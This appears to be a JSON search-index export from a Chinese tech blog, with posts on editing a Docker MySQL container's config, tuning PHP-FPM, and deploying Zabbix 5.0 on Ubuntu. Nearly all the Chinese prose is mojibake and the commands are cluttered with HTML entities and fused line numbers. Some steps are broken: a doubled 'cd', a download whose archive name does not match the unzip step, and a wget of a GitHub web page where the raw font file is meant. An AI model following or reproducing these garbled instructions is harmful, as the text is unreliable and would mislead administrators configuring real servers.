mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf è¿™é‡Œå¯èƒ½ä¼šå‡ºç°å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºæ¯ä¸€æ¬¡é‡å¯Mysql å®¹å™¨éƒ½ä¼šä¿ç•™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥ç†è®ºä¸Šï¼Œç›´æ¥ä¿®æ”¹ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå°±æ˜¯å½“å‰Mysql æ‰€ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ã€‚ ä¿®æ”¹é…ç½®æ–‡ä»¶ é‡å¯å®¹å™¨å³å¯ã€‚ æ–¹å¼äºŒå¦‚æœç¬¬ä¸€ç§æ–¹å¼æ²¡ç”Ÿæ•ˆï¼Œé‚£å¯ä»¥å°è¯•ç¬¬äºŒç§æ–¹å¼ã€‚ å¤åˆ¶å®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶åˆ°ä¸»æœºï¼š 123# è¯­æ³•ï¼šdocker cp &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt; &lt;éœ€è¦å¤åˆ¶åˆ°ä¸»æœºçš„è·¯å¾„&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf ä¿®æ”¹ä¸»æœºä¸­çš„é…ç½®æ–‡ä»¶ å°†è¯¥é…ç½®æ–‡ä»¶mv åˆ°å®¹å™¨ä¸­ï¼š 123# è¯­æ³•ï¼šdocker cp &lt;é…ç½®æ–‡ä»¶åœ¨ä¸»æœºä¸­çš„è·¯å¾„&gt; &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf é‡å¯é…ç½®æ–‡ä»¶å³å¯ã€‚ æ€»ç»“ï¼šä¸¤ç§æ–¹å¼å‡å¯ä»¥æœ‰æ•ˆè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå½“ç„¶è¿™ç±»æ–¹å¼ä»…é€‚ç”¨äºå®¹å™¨æ˜¯å› é”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µã€‚ å‚è€ƒé“¾æ¥ Dockerä¿®æ”¹æ— æ³•å¯åŠ¨çš„å®¹å™¨çš„é…ç½®æ–‡ä»¶","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP-FPM é…ç½®åˆå§‹åŒ–","slug":"php-fpm-configuration-initialization","date":"2020-09-06T03:57:11.000Z","updated":"2020-09-06T04:05:33.658Z","comments":true,"path":"php-fpm-configuration-initialization/","link":"","permalink":"https://www.0x2beace.com/php-fpm-configuration-initialization/","excerpt":"php-fpmï¼ˆFastCGI Process Mangerï¼‰æ˜¯ä¸€ä¸ªPHP FastCGI ç®¡ç†å™¨ï¼Œä¸“é—¨å’ŒNginx çš„ ngx_fastcgi_modulæ¨¡å—å¯¹æ¥ï¼Œç”¨æ¥å¤„ç†åŠ¨æ€è¯·æ±‚ã€‚","text":"php-fpmï¼ˆFastCGI Process Mangerï¼‰æ˜¯ä¸€ä¸ªPHP FastCGI ç®¡ç†å™¨ï¼Œä¸“é—¨å’ŒNginx çš„ ngx_fastcgi_modulæ¨¡å—å¯¹æ¥ï¼Œç”¨æ¥å¤„ç†åŠ¨æ€è¯·æ±‚ã€‚ åˆå§‹åŒ–å½“å®‰è£…äº†PHP ä¹‹åï¼Œå¯ä»¥ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹å‘æ¥å¯¹é»˜è®¤é…ç½®è¿›è¡Œä¿®æ”¹ï¼Œä»¥è¾¾åˆ°ä¼˜åŒ–çš„æ•ˆæœã€‚ 1. æ ¸å¿ƒé…ç½®æ–‡ä»¶æ ¸å¿ƒé…ç½®æ–‡ä»¶å…¶å®å°±æ˜¯ php.iniï¼Œè¯¥é…ç½®æ–‡ä»¶çš„ä½œç”¨é€šå¸¸æ˜¯ç”¨æ¥å¯ç”¨æˆ–ç¦ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—ï¼ŒåŠä¿®æ”¹PHP æ—¶åŒºç­‰ã€‚ 123# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inidate.timezone &#x3D; Asia&#x2F;Shanghai 2. å…¨å±€é…ç½®æ–‡ä»¶å…¨å±€é…ç½®æ–‡ä»¶php-fpm.confï¼Œé€šå¸¸ç”¨æ¥é…ç½®ä¸€äº›è¾…åŠ©æ€§åŠŸèƒ½ã€‚ 123456# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.conferror_log &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;error.loglog_level &#x3D; notice;process_max &#x3D; 0deamonize &#x3D; yes å‚æ•°è§£æï¼š error_logï¼šé”™è¯¯æ—¥å¿—è·¯å¾„ log_levelï¼šæ—¥å¿—çº§åˆ«ï¼Œé»˜è®¤ä¸ºnotice alertï¼šå¿…é¡»ç«‹å³å¤„ç† errorï¼šé”™è¯¯æƒ…å†µ warningï¼šè­¦å‘Šæƒ…å†µ noticeï¼šä¸€èˆ¬é‡è¦ä¿¡æ¯ debugï¼šè°ƒè¯•ä¿¡æ¯ process_maxï¼šæ§åˆ¶æœ€å¤§å­è¿›ç¨‹æ•°çš„å…¨å±€å˜é‡ï¼Œä¸å»ºè®®è®¾ç½®å…·ä½“æ•°é‡ï¼Œå› ä¸ºä¼šé™åˆ¶æ‰©å±•é…ç½®ã€‚ daemonizeï¼šæ˜¯å¦å¼€å¯å®ˆæŠ¤è¿›ç¨‹ï¼Œé»˜è®¤ä¸ºyes é€šå¸¸ä¸ä¼šåœ¨php-fpm.confä¸­è®¾å®š process_maxï¼Œå› ä¸ºä¼šé™åˆ¶www.confä¸­çš„é…ç½®ã€‚ 3. æ‰©å±•é…ç½®æ–‡ä»¶æ‰©å±•é…ç½®æ–‡ä»¶www.confé€šå¸¸æ˜¯ä¸php-fpmæœåŠ¡ç›¸å…³çš„é…ç½®ï¼Œå¤§éƒ¨åˆ†ä¼˜åŒ–éƒ½æ˜¯éœ€è¦æ›´æ”¹è¿™ä¸ªé…ç½®æ–‡ä»¶ã€‚ 123456789101112# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conflisten &#x3D; 127.0.0.1:9000slowlog &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;www-slow.log# è¿™é‡ŒæŒ‰ç…§10G çš„ç©ºé—²å†…å­˜å»è®¾å®špm &#x3D; dynamicpm.start_servers &#x3D; 16pm.max_children &#x3D; 256pm.min_spare_servers &#x3D; 16pm.max_spare_servers &#x3D; 32pm.max_requests &#x3D; 1000 å‚æ•°è§£æï¼š listenï¼šæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥è¿›è¡Œé€šè®¯ã€‚ socketï¼šunix:/run/php/php7.3-fpm.sock httpï¼š127.0.0.1:9000 å› ä¸ºphp-fpmä¸ngx_fastcgi_modulçš„é€šè®¯æ–¹å¼æ˜¯ 9000ç«¯å£ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ 127.0.0.1:9000 slowlogï¼šæ…¢æŸ¥è¯¢æ—¥å¿—è·¯å¾„ pmï¼šè¿›ç¨‹ç®¡ç†æ–¹å¼ staticï¼šé™æ€æ¨¡å¼ã€‚å§‹ç»ˆä¿æŒå›ºå®šæ•°é‡çš„å­è¿›ç¨‹æ•°ï¼Œé…åˆæœ€å¤§å­è¿›ç¨‹æ•°ä¸€èµ·ä½¿ç”¨ï¼Œè¿™ä¸ªæ–¹å¼å¾ˆä¸çµæ´»ï¼Œé€šå¸¸ä¸æ˜¯é»˜è®¤ã€‚ pm.max_childrenï¼šæœ€å¤§å­è¿›ç¨‹æ•°ã€‚ dynamicï¼šåŠ¨æ€æ¨¡å¼ã€‚æŒ‰ç…§å›ºå®šçš„æœ€å°å­è¿›ç¨‹æ•°å¯åŠ¨ï¼ŒåŒæ—¶ç”¨æœ€å¤§å­è¿›ç¨‹æ•°å»é™åˆ¶ã€‚ pm.start_serversï¼šé»˜è®¤å¼€å¯çš„è¿›ç¨‹æ•° pm.min_spare_serversï¼šæœ€å°ç©ºé—²çš„è¿›ç¨‹æ•° pm.max_spare_serversï¼šæœ€å¤§ç©ºé—²çš„è¿›ç¨‹æ•° pm.max_childrenï¼šæœ€å¤§å­è¿›ç¨‹æ•° pm.max_requestsï¼šæ¯ä¸ªè¿›ç¨‹èƒ½å“åº”çš„è¯·æ±‚æ•°é‡ï¼Œè¾¾åˆ°æ­¤é™åˆ¶ä¹‹åï¼Œè¯¥PHP è¿›ç¨‹å°±ä¼šè¢«è‡ªåŠ¨é‡Šæ”¾æ‰ã€‚ nodaemonizeï¼šæ¯ä¸ªè¿›ç¨‹åœ¨é—²ç½®ä¸€å®šæ—¶å€™åå°±ä¼šè¢«æ€æ‰ã€‚ pm.max_childrenï¼šæœ€å¤§å­è¿›ç¨‹æ•° pm.process_idle_timeoutï¼šåœ¨å¤šå°‘ç§’ä¹‹åï¼Œä¸€ä¸ªç©ºé—²çš„è¿›ç¨‹å°†ä¼šè¢«æ€æ­» æ³¨æ„ï¼šmax_children æ˜¯ PHPFPM Pool æœ€å¤§çš„å­è¿›ç¨‹æ•°ï¼Œå®ƒçš„æ•°å€¼å–å†³äºæœåŠ¡å™¨å®é™…ç©ºé—²å†…å­˜ã€‚å‡è®¾ä½ æœ‰ä¸€å°10G è¿è¡Œå†…å­˜çš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç©ºé—²çš„PHP è¿›ç¨‹å ç”¨çš„æ˜¯ 1M å†…å­˜ï¼Œè€Œä¸€ä¸ªæ­£åœ¨å¤„ç†è¯·æ±‚çš„PHP è¿›ç¨‹ å¤§æ¦‚ä¼šå ç”¨10M-40Må†…å­˜ï¼Œè¿™é‡ŒæŒ‰ç…§æ¯ä¸ªPHP è¯·æ±‚å ç”¨ 40M å†…å­˜ï¼Œé‚£ä¹ˆmax_children = 10*1024M/40M = 256ï¼Œæ‰€ä»¥è¿™ä¸ªå€¼å¾—æ ¹æ®å®é™…ç¯å¢ƒè€Œè®¾å®šã€‚ ä»¥ä¸Šå°±æ˜¯php-fpm åˆå§‹åŒ–é…ç½®çš„æ ¸å¿ƒéƒ¨åˆ†äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"Zabbix å¿«é€Ÿä¸Šæ‰‹â€”â€”éƒ¨ç½²","slug":"zabbix-quick-start","date":"2020-09-05T00:49:02.000Z","updated":"2020-12-06T15:14:35.561Z","comments":true,"path":"zabbix-quick-start/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start/","excerpt":"å› ä¸ºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œéƒ¨åˆ†ç¯å¢ƒä¸æ˜¯æ­å»ºåœ¨äº‘ä¸Šé¢ï¼Œè€Œæ˜¯åœ¨æ‰˜ç®¡çš„å®ä½“æœºä¸Šé¢ï¼Œè¿™å°±å¯¼è‡´åŸæœ¬å¾ˆå¤šäº‘å¯ä»¥å¸®æˆ‘ä»¬åšçš„äº‹æƒ…ï¼Œç°åœ¨åªèƒ½è‡ªå·±å»åšäº†ã€‚æ¯”å¦‚ï¼šç›‘æ§ç³»ç»Ÿã€‚ æœ¬ç€ä¸æƒ³å½“è¿ç»´çš„å‰ç«¯ä¸æ˜¯ä¸€ä¸ªå¥½å…¨æ ˆçš„æ€æƒ³ï¼Œæˆ‘è¿«åˆ‡éœ€è¦è‡ªå·±æ­å»ºä¸€å¥—å®Œæ•´çš„ç›‘æ§ç³»ç»Ÿæ¥è§£æ”¾è‡ªå·±çš„åŒæ‰‹ğŸ‘ï¸ã€‚","text":"å› ä¸ºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œéƒ¨åˆ†ç¯å¢ƒä¸æ˜¯æ­å»ºåœ¨äº‘ä¸Šé¢ï¼Œè€Œæ˜¯åœ¨æ‰˜ç®¡çš„å®ä½“æœºä¸Šé¢ï¼Œè¿™å°±å¯¼è‡´åŸæœ¬å¾ˆå¤šäº‘å¯ä»¥å¸®æˆ‘ä»¬åšçš„äº‹æƒ…ï¼Œç°åœ¨åªèƒ½è‡ªå·±å»åšäº†ã€‚æ¯”å¦‚ï¼šç›‘æ§ç³»ç»Ÿã€‚ æœ¬ç€ä¸æƒ³å½“è¿ç»´çš„å‰ç«¯ä¸æ˜¯ä¸€ä¸ªå¥½å…¨æ ˆçš„æ€æƒ³ï¼Œæˆ‘è¿«åˆ‡éœ€è¦è‡ªå·±æ­å»ºä¸€å¥—å®Œæ•´çš„ç›‘æ§ç³»ç»Ÿæ¥è§£æ”¾è‡ªå·±çš„åŒæ‰‹ğŸ‘ï¸ã€‚ æˆ‘å¸Œæœ›è¿™å¥—ç›‘æ§ç³»ç»Ÿæ˜¯æ€æ ·çš„ï¼Ÿ å…è´¹å¼€æº å…¥é—¨ç›¸å¯¹å®¹æ˜“ æ”¯æŒå¤šå¹³å°åˆ†å¸ƒå¼ç›‘æ§ ç»¼åˆä»¥ä¸Šéœ€æ±‚ï¼Œæœ€åæˆ‘é€‰æ‹©äº† Zabbix ã€‚ ç½‘ä¸Šæ‰¾äº†ä¸€åœˆï¼Œå¹¶æ²¡æœ‰å‘ç°åˆé€‚çš„å…¥é—¨æ•™ç¨‹ï¼Œè¦ä¹ˆæ˜¯æ•™ç¨‹å¤ªè€äº†ï¼Œè¦ä¹ˆæ˜¯å†™çš„ä¸å¤Ÿè¯¦ç»†ï¼Œå­¦ä¹ æ›²çº¿å¾ˆé™¡ï¼Œå…‰æ˜¯éƒ¨ç½²å°±å¾ˆè´¹åŠ²ï¼Œè€ŒZabbix é‡è¦çš„ä¸æ˜¯éƒ¨ç½²ï¼Œè€Œæ˜¯å­¦ä¼šå¦‚ä½•ä½¿ç”¨ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°å°±æ˜¯ç”¨æ¥è®°å½•å¦‚ä½•å¿«é€Ÿéƒ¨ç½² Zabbixã€‚ è®¤è¯† ZabbixZabbix æ˜¯ä¸€ä¸ªä¼ä¸šçº§çš„åˆ†å¸ƒå¼å¼€æºç›‘æ§æ–¹æ¡ˆã€‚ ä¸€ä¸ªå®Œæ•´çš„ç›‘æ§ç³»ç»Ÿæ˜¯ç”±æœåŠ¡æœºï¼ˆzabbix serverï¼‰å’Œå®¢æˆ·æœºï¼ˆzabbix zgentï¼‰ç»„æˆï¼Œè¿è¡Œå¤§æ¦‚æµç¨‹æ˜¯è¿™æ ·çš„ï¼š zabbix agent éœ€è¦å®‰è£…åˆ°è¢«ç›‘æ§çš„ä¸»æœºä¸Šï¼Œå®ƒè´Ÿè´£å®šæœŸæ”¶é›†å„é¡¹æ•°æ®ï¼Œå¹¶å‘é€åˆ° zabbix server ç«¯ï¼Œzabbix serverå°†æ•°æ®å­˜å‚¨åˆ°è‡ªå·±çš„æ•°æ®åº“ä¸­ï¼Œzabbix webæ ¹æ®æ•°æ®åœ¨å‰ç«¯è¿›è¡Œå±•ç°å’Œç»˜å›¾ã€‚è¿™é‡Œ agent æ”¶é›†æ•°æ®åˆ†ä¸ºä¸»åŠ¨å’Œè¢«åŠ¨ä¸¤ç§æ¨¡å¼ï¼š ä¸»åŠ¨ï¼šagent è¯·æ±‚server è·å–ä¸»åŠ¨çš„ç›‘æ§é¡¹åˆ—è¡¨ï¼Œå¹¶ä¸»åŠ¨å°†ç›‘æ§é¡¹å†…éœ€è¦æ£€æµ‹çš„æ•°æ®æäº¤ç»™ server/proxy ã€‚ è¢«åŠ¨ï¼šserver å‘agentè¯·æ±‚è·å–ç›‘æ§é¡¹çš„æ•°æ®ï¼Œagentè¿”å›æ•°æ®ã€‚ å·¥ä½œåŸç†ï¼š å®‰è£…ç³»ç»Ÿç¯å¢ƒï¼š Ubuntu 18.04 LTS Mysql 5.7 PHP 7.2 Nginx Zabbix 5.0 1. å®‰è£…æ•°æ®åº“åœ¨æ­£å¼å®‰è£…ä¹‹å‰ï¼Œè¿™é‡Œæ¨èå…ˆå»å®˜ç½‘æ‰¾åˆ°ç¬¦åˆè‡ªå·±çš„ Zabbix æœåŠ¡å™¨å¹³å°ã€‚ æ ¹æ®è‡ªå·±çš„å®é™…ç¯å¢ƒæ¥æ‰¾åˆ°å±äºè‡ªå·±çš„ä¸‹è½½é“¾æ¥ï¼Œæ¯”å¦‚æˆ‘æ˜¯Zabbix 5.0 + Ubuntu 18.04 + Mysql + Nginxï¼Œæ‰€ä»¥æˆ‘çš„å®‰è£…æ–¹å¼åº”è¯¥æ˜¯ï¼š 123$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update 2. å®‰è£…Zabbix serverï¼ŒWebå‰ç«¯ï¼Œagent1$ apt install zabbix-server-mysql zabbix-frontend-php zabbix-nginx-conf zabbix-agent Zabbix Serverï¼šç”¨æ¥æ¥æ”¶å¹¶å¤„ç† Zabbix agent ä¼ è¿‡æ¥çš„æ•°æ® Web å‰ç«¯ï¼šZabbix çš„äº¤äº’ç•Œé¢ Zabbix agentï¼šéœ€è¦è¢«ç›‘æ§çš„ä¸»æœº 3. åˆå§‹æ•°æ®åº“å®‰è£…å®Œæ•°æ®åº“ä¹‹åï¼Œå¹¶ä¸èƒ½ç›´æ¥ç™»å½•ï¼Œå› ä¸ºä¸çŸ¥é“root ç”¨æˆ·çš„å¯†ç ï¼Œæ‰€ä»¥éœ€è¦é‡ç½®root ç”¨æˆ·çš„å¯†ç ï¼Œé‡ç½®çš„æ–¹å¼æœ‰å¤šç§ï¼Œè¿™é‡Œæ¨èæˆ‘å¸¸ä½¿ç”¨çš„çš„ä¸€ç§ã€‚ 123456# vim &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysql.conf # ä¹Ÿè®¸ä½ ç¼–è¾‘çš„é…ç½®æ–‡ä»¶å’Œæˆ‘çš„åç§°ä¸ä¸€æ ·ï¼Œä¸è¿‡æ²¡å…³ç³»ã€‚# æ·»åŠ ä¸‹é¢ä¸¤è¡Œé…ç½®[mysqld]skip-grant-tables é‡å¯Mysql æœåŠ¡ï¼š 1$ service mysql restart ç°åœ¨çš„root ç”¨æˆ·å·²ç»æ²¡æœ‰å¯†ç äº†ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥è¦åšçš„å°±æ˜¯ä¿®æ”¹root ç”¨æˆ·å¯†ç ï¼š 123$ mysql -hlocalhost -uroot -pmysql &gt; UPDATE mysql.user SET authentication_string&#x3D;PASSWORD(&#39;password&#39;), plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39; AND Host&#x3D;&#39;localhost&#39;; ç„¶åå†æ¬¡ä¿®æ”¹åˆšæ‰çš„é…ç½®æ–‡ä»¶ï¼Œå°†ä¸‹é¢é‚£è¡Œé…ç½®ç»™æ³¨é‡Šæ‰ï¼Œ æœ€åé‡å¯Mysql æœåŠ¡å°±å¯ä»¥äº†ã€‚ Mysql é»˜è®¤ç”¨æˆ·æ˜¯rootï¼Œè¿™é‡Œä¸æ¨èç›´æ¥ä½¿ç”¨ root ç”¨æˆ·å»ç®¡ç† zabbix æ•°æ®åº“ï¼Œæ‰€ä»¥è¿˜æ˜¯ä½¿ç”¨å®˜æ–¹æ¨èçš„æ–¹å¼ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å»ç®¡ç†ï¼š 1234567$ mysql -hlocalhost -uroot -pmysql&gt; create database zabbix character set utf8 collate utf8_bin;mysql&gt; create user zabbix@localhost identified by &#39;password&#39;;mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;mysql&gt; flush privileges;mysql&gt; quit; è¿™é‡Œé»˜è®¤Mysql æ˜¯è¿è¡Œåœ¨æœ¬åœ°æœºå™¨ä¸Šï¼Œå¦‚æœMysql è¿è¡Œåœ¨å®¹å™¨ä¸­ï¼Œè€ŒZabbix åˆè¿è¡Œåœ¨æœ¬æœºä¸Šï¼Œå¯èƒ½ä¼šå‡ºç°ä¸€äº›å¼‚å¸¸ï¼ˆæˆ‘é‡åˆ°äº†ä½†æ²¡èƒ½è§£å†³ï¼‰ã€‚ å¯¼å…¥åˆå§‹æ¶æ„å’Œæ•°æ®ã€‚ 1$ zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix 4. é…ç½®æ•°æ®åº“ä¸ºZabbix serveré…ç½®æ•°æ®åº“ï¼Œ 123# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.confDBPassword&#x3D;password 5. é…ç½®Web12345# vim &#x2F;etc&#x2F;zabbix&#x2F;nginx.conf# å»æ‰å‰é¢çš„æ³¨é‡Šï¼Œæ¢æˆä½ è‡ªå·±çš„ç«¯å£æˆ–è€…åŸŸåã€‚# listen 80;# server_name example.com; 6. é…ç½®æ—¶åŒº123# vim &#x2F;etc&#x2F;zabbix&#x2F;php-fpm.confphp_value[date.timezone] &#x3D; Asia&#x2F;Shanghai 7. å¯åŠ¨æœåŠ¡å¯åŠ¨Zabbix serverå’Œagent è¿›ç¨‹ï¼Œå¹¶ä¸ºå®ƒä»¬è®¾ç½®å¼€æœºè‡ªå¯ï¼š 12$ systemctl restart zabbix-server zabbix-agent nginx php7.2-fpm$ systemctl enable zabbix-server zabbix-agent nginx php7.2-fpm ä¸€åˆ‡å‡†å¤‡å°±ç»ªä¹‹åï¼Œå°±å¯ä»¥è®¿é—®äº†ï¼šhttp://server_ip_or_nameï¼Œå¦‚æœä½ ä¸Šé¢é…ç½®çš„ä¸æ˜¯80 ç«¯å£ï¼Œé‚£å¾—è®°å¾—åŠ ä¸Šå¯¹åº”çš„ç«¯å£ã€‚å¦‚æœä½ ä¸èƒ½æ­£å¸¸è®¿é—®ï¼Œé‚£å¯èƒ½æ˜¯å› ä¸ºé˜²ç«å¢™æ²¡æœ‰å…è®¸è¯¥ç«¯å£ã€‚ åˆæ¬¡è¿›æ¥ï¼Œéœ€è¦é…ç½®ç›¸å…³å‚æ•°ï¼Œç¡®è®¤æ— è¯¯ä¹‹åï¼Œç‚¹å‡» Next stepã€‚ Zabbix é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯Adminã€zabbixï¼Œé¡ºåˆ©ç™»å½•åˆ°åå°ä¹‹åï¼Œè®°å¾—ä¿®æ”¹é»˜è®¤ç™»å½•å¯†ç ã€‚ é…ç½®ä¸­æ–‡è¯­è¨€åŒ…å¦‚æœéœ€è¦è®¾ç½®ä¸­æ–‡ç‰ˆçš„ç¯å¢ƒï¼Œéœ€è¦åšä¸€äº›é¢å¤–çš„é…ç½®ã€‚ 1$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;locales.inc.php å°†zh_CN åé¢å‚æ•°æ”¹ä¸º trueã€‚ å¦‚æœåœ¨é€‰æ‹©è¯­è¨€æ—¶ï¼Œå‘ç°è¿˜æ˜¯ä¸èƒ½é€‰æ‹©ï¼Œå¹¶ä¸”æç¤ºï¼š You are not able to choose some of the languages, because locales for them are not installed on the web server. è¿™æ˜¯å› ä¸ºä½ ç³»ç»Ÿé‡Œæ²¡ä¸­æ–‡ç¯å¢ƒï¼ŒæŸ¥çœ‹å½“å‰çš„æ‰€æœ‰ç³»ç»Ÿè¯­è¨€ç¯å¢ƒ 1$ locale -a 1. å®‰è£…ä¸­æ–‡åŒ…1apt-get install language-pack-zh-hant language-pack-zh-hans 2. é…ç½®ç¯å¢ƒå˜é‡å¢åŠ è¯­è¨€å’Œç¼–ç çš„è®¾ç½®ï¼š 1234# vim &#x2F;etc&#x2F;environmentLANG&#x3D;&quot;zh_CN.UTF-8&quot;LANGUAGE&#x3D;&quot;zh_CN:zh:en_US:en&quot; 3. æ›¿æ¢Zabbix è¯­è¨€åŒ…12345$ cd cd &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;locale&#x2F;zh_CN&#x2F;LC_MESSAGES$ wget https:&#x2F;&#x2F;github.com&#x2F;echohn&#x2F;zabbix-zh_CN&#x2F;archive&#x2F;v0.1.0.zip$ unzip master.zip$ rm frontend.mo$ cp zabbix-zh_CN-master&#x2F;frontend.mo frontend.mo 4. è§£å†³ä¹±ç é—®é¢˜12345$ wget https:&#x2F;&#x2F;github.com&#x2F;chenqing&#x2F;ng-mini&#x2F;blob&#x2F;master&#x2F;font&#x2F;msyh.ttf$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php# æ‰¾åˆ° define(&#39;ZBX_GRAPH_FONT_NAME&#39;, &#39;graphfont&#39;);# å°†graphfont æ›¿æ¢æˆ msyh 5. æ›´æ–°mibs åº“1$ apt-get install snmp-mibs-downloader 6. é‡å¯æœåŠ¡1$ systemctl restart zabbix-server zabbix-agent php7.2-fpm è‡³æ­¤Zabbix çš„å®Œæ•´éƒ¨ç½²è¿‡ç¨‹å°±å…¨ä»‹ç»å®Œäº†ã€‚ å‚è€ƒé“¾æ¥ Zabbix 3.0 for Ubuntu 14.04 LTS å®‰è£… ä¸‹è½½å®‰è£…Zabbixâ€”â€”Zabbix å®˜ç½‘ ä¼ä¸šçº§åˆ†å¸ƒå¼ç›‘æ§ç³»ç»Ÿâ€“zabbix","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"ç›‘æ§ç³»ç»Ÿ","slug":"ç›‘æ§ç³»ç»Ÿ","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"}]},{"title":"Zabbix å¿«é€Ÿä¸Šæ‰‹â€”â€”æ·»åŠ Agent ä¸»æœº","slug":"zabbix-add-agent-host","date":"2020-09-04T13:48:16.000Z","updated":"2020-09-08T13:03:21.864Z","comments":true,"path":"zabbix-add-agent-host/","link":"","permalink":"https://www.0x2beace.com/zabbix-add-agent-host/","excerpt":"Zabbix-Server å®‰è£…å®Œæˆä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦æ·»åŠ ä¸»æœºæ‰èƒ½çœ‹åˆ°æ•°æ®ã€‚","text":"Zabbix-Server å®‰è£…å®Œæˆä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦æ·»åŠ ä¸»æœºæ‰èƒ½çœ‹åˆ°æ•°æ®ã€‚ å®‰è£…Zabbix AgentZabbix Agent çš„ä½œç”¨æ˜¯å°†æœåŠ¡å™¨çš„æ•°æ®å‘é€ç»™ Zabbix Serverï¼Œæ‰€ä»¥åªéœ€è¦åœ¨éœ€è¦ç›‘æ§çš„ä¸»æœºä¸Šå®‰è£… Zabbix Agent å°±å¤Ÿäº†ã€‚ å› ä¸ºæˆ‘çš„ç¯å¢ƒæ˜¯ï¼šUbuntu 18.04ã€Nginxã€Mysqlã€PHPï¼Œæ ¹æ®å®˜ç½‘çš„é€‰æ‹©å¯¹åº”çš„ä¸‹è½½é“¾æ¥ã€‚ åœ¨æœ‰äº†Mysql å’Œ Nginxçš„æƒ…å†µä¸‹ï¼Œè¿™é‡Œæˆ‘åªé€‰æ‹©å®‰è£… Zabbix 